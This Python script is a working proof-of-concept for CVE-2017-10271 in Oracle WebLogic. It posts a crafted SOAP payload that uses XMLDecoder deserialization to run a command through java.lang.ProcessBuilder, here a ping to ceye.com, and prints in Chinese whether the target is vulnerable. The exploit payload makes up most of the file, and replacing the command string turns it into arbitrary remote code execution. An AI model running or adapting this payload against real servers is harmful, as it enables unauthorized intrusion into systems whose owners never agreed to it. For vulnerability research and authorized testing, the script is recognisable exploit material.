#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''
 ____       _     _     _ _   __  __           _
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\

'''
import requests
import re


VUL = ['CVE-2017-10271']
headers = {'user-agent': 'ceshi/0.0.1'}


def poc(url, index):
    if not url.startswith("http"):
        url = "http://" + url
    if "/" in url:
        url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <void class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="2">
                <void index="0">
                  <string>/usr/sbin/ping</string>
                </void>
                <void index="1">
                  <string>ceye.com</string>
                </void>
              </array>
              <void method="start"/>
            </void>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(
            url,
            data=post_str,
            verify=False,
            timeout=5,
            headers=headers)
        response = response.text
        response = re.search(
            r"\<faultstring\>.*\<\/faultstring\>",
            response).group(0)
    except Exception:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        return (
            '[+]目标WebLogic具有Java反序列化漏洞:{}{}'.format(VUL[index], "\n"))
    else:
        return '[-]未检测到目标WebLogic:{}{}'.format(VUL[index], "\n")


def run(rip, rport, index):
    url = rip + ':' + str(rport)
    poc(url=url, index=index)
